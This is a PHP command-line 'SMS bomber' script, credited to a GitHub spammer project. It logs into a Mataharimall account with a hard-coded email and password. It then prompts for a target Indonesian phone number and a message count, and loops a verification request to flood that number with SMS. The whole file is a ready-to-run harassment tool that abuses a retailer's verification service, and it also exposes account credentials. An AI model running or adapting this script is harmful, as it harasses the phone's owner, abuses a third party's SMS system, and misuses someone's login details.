<?php
/*
    https://github.com/sontolesquad/Spammer
    Made by Muhammad Zainul Ramadhan / Mrsontolex
    Modified by まやちゃん
*/

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "Mrsontolex@gmail.com";
$init->pass = "Sontole";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber
echo "Nomor Target (pakai 62): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
